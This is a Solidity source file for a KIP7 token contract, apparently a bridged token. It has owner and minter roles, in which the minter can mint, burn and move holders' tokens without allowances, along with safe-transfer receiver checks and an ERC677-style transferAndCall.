pragma solidity ^0.5.0;

import '../standard/IKIP7.sol';
import '../standard/KIP13.sol';

contract IKIP7Receiver {
    function onKIP7Received(address _operator, address _from, uint256 _amount, bytes memory _data) public returns (bytes4);
}

contract ERC677Receiver {
    function onTokenTransfer(address _sender, uint _value, bytes memory _data) public;
}

contract KIP7 is KIP13, IKIP7 {
    event SetOwner(address owner);
    event SetMinter(address minter);
    event SetTokenInfo(string name, string symbol);
    event Transfer(address indexed from, address indexed to, uint amount);
    event Approval(address indexed holder, address indexed spender, uint amount);

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint private _totalSupply = 0;

    // ------ KIP7 INTERFACE ------
    bytes4 private constant _KIP7_RECEIVED = 0x9d188c22;
    bytes4 private constant _INTERFACE_ID_KIP7 = 0x65787371;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;   // (holder, spender)

    // --- Owner ---
    address public _owner;

    // --- Contracts & Constructor ---
    address public _minter;

    bool public isInitialized;

    modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }

    modifier onlyOwnerOrBeforeInit {
        require(msg.sender == _owner || isInitialized == false);
        _;
    }

    constructor(address owner, address minter, string memory name, string memory symbol, uint8 decimals, bool init) public {
        _owner = owner;
        _minter = minter;
        _name = name;
        _symbol = symbol;
        _decimals = decimals;

        isInitialized = init;
    }

    function _version() public view returns(string memory name, string memory version) {
        return (_name, "KIPChainLink20210901");
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function setOwner(address owner) public onlyOwner {
        require(owner != address(0));
        _owner = owner;
        emit SetOwner(owner);
    }

    function setMinter(address minter) public onlyOwner {
        require(minter != address(0));
        _minter = minter;
        emit SetMinter(minter);
    }

    function setTokenInfo(string memory tokenName, string memory tokenSymbol) public onlyOwnerOrBeforeInit {
        _name = tokenName;
        _symbol = tokenSymbol;

        if(isInitialized == false) isInitialized = true;

        emit SetTokenInfo(tokenName, tokenSymbol);
    }

    // --- Math ---
    function safeAdd(uint a, uint b) private pure returns (uint) {
        require(a <= uint(-1) - b);
        return a + b;
    }

    function safeSub(uint a, uint b) private pure returns (uint) {
        require(a >= b);
        return a - b;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function safeTransfer(address recipient, uint256 amount) public {
        safeTransfer(recipient, amount, "");
    }

    function safeTransfer(address recipient, uint256 amount, bytes memory data) public {
        transfer(recipient, amount);
        require(_checkOnKIP7Received(msg.sender, recipient, amount, data), "KIP7: transfer to non KIP7Receiver implementer");
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);

        if(msg.sender != _minter){
            _approve(sender, msg.sender, safeSub(_allowances[sender][msg.sender], amount));
        }

        return true;
    }

    function safeTransferFrom(address sender, address recipient, uint256 amount) public {
        safeTransferFrom(sender, recipient, amount, "");
    }

    function safeTransferFrom(address sender, address recipient, uint256 amount, bytes memory data) public {
        transferFrom(sender, recipient, amount);
        require(_checkOnKIP7Received(sender, recipient, amount, data), "KIP7: transfer to non KIP7Receiver implementer");
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function increaseApproval(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, safeAdd(_allowances[msg.sender][spender], value));
        return true;
    }

    function decreaseApproval(address spender, uint256 value) public returns (bool) {
        if(value > _allowances[msg.sender][spender]){
            value = 0;
        }
        else{
            value = safeSub(_allowances[msg.sender][spender], value);
        }

        _approve(msg.sender, spender, value);
        return true;
    }

    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "KIP7: approve from the zero address");
        require(spender != address(0), "KIP7: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "KIP7: transfer from the zero address");
        require(recipient != address(0), "KIP7: transfer to the zero address");

        if (sender == _minter && msg.sender == _minter) {
            _mint(recipient, amount);
            return;
        }

        if (recipient == _minter && msg.sender == _minter) {
            _burn(sender, amount);
            return;
        }

        _balances[sender] = safeSub(_balances[sender], amount);
        _balances[recipient] = safeAdd(_balances[recipient], amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "KIP7: mint to the zero address");

        _totalSupply = safeAdd(_totalSupply, amount);
        _balances[account] = safeAdd(_balances[account], amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "KIP7: burn from the zero address");

        _totalSupply = safeSub(_totalSupply, value);
        _balances[account] = safeSub(_balances[account], value);
        emit Transfer(account, address(0), value);
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;

        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function _checkOnKIP7Received(address sender, address recipient, uint256 amount, bytes memory _data)
    internal returns (bool)
    {
        if (!isContract(recipient)) {
            return true;
        }

        bytes4 retval = IKIP7Receiver(recipient).onKIP7Received(msg.sender, sender, amount, _data);
        return (retval == _KIP7_RECEIVED);
    }

    /**
    * @dev transfer token to a contract address with additional data if the recipient is a contact.
    * @param _to The address to transfer to.
    * @param _value The amount to be transferred.
    * @param _data The extra data to be passed to the receiving contract.
    */
    function transferAndCall(address _to, uint _value, bytes memory _data)
        public
        returns (bool success)
    {
        require(_to != address(this));
        _transfer(msg.sender, _to, _value);
        if (isContract(_to)) {
            ERC677Receiver receiver = ERC677Receiver(_to);
            receiver.onTokenTransfer(msg.sender, _value, _data);
        }
        return true;
    }
}
